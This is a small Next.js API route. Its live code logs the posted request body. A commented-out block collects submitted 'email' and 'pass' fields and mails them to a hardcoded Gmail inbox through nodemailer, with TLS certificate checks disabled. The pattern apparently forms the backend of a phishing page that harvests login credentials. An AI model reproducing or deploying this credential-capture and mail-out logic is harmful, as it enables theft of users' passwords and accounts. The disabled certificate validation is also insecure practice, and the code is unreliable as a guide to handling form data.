// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

export default function handler(req, res) {
  console.log(req.body);
  // let { email, pass } = req.body;
  // const transporter = nodemailer.createTransport({
  //   host: "smtp.gmail.com",
  //   port: 25,
  //   secure: false,
  //   auth: {
  //     user: "hinayupak022@gmail.com",
  //     pass: process.env.PASSWORD,
  //   },
  //   tls: {
  //     // do not fail on invalid certs
  //     rejectUnauthorized: false,
  //   },
  // });
  // const mailData = {
  //   from: "hinayupak022@gmail.com",
  //   to: "hinayupak022@gmail.com",
  //   subject: `Message From Test`,
  //   text: email + " " + pass,
  //   html: `<div>${email} ${pass} </div>`,
  // };
  // transporter.sendMail(mailData);
  res.status(200).send("test");
}
